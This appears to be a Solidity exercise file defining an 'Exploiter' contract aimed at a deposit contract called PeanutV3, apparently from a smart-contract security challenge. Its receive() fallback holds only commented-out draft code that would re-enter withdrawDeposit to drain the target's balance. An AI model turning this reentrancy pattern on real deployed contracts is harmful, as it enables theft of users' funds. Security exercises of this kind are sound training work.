import "./PeanutV3.sol";

contract Exploiter {

    PeanutV3 peanutV3;

    constructor(
        PeanutV3 peanutV3_
    ) {
        // Your code here
        peanutV3 = peanutV3_;
    }

    uint256 public depositId;
    bytes32 public signedMessageHash;
    bytes public signature;
    uint256 public amount; 

    function setParams(
        uint256 depositId_,
        bytes32 signedMessageHash_,
        bytes memory signature_,
        uint256 amount_
    ) public {
        depositId = depositId_;
        signedMessageHash = signedMessageHash_;
        signature = signature_;
        amount = amount_;
    }

    uint public reentrancyCount = 1;

    receive() external payable {
        // if (address(peanutV3).balance >= amount) {
        //     reentrancyCount++;

        //     peanutV3.withdrawDeposit(
        //         depositId, 
        //         address(this), 
        //         signedMessageHash, 
        //         signature
        //     );
        // }

        // if (reentrancyCount == 0) {
        //     peanutV3.withdrawDeposit(
        //         depositId, 
        //         address(this), 
        //         signedMessageHash, 
        //         signature
        //     );
        // }

        // reentrancyCount++;
    }
}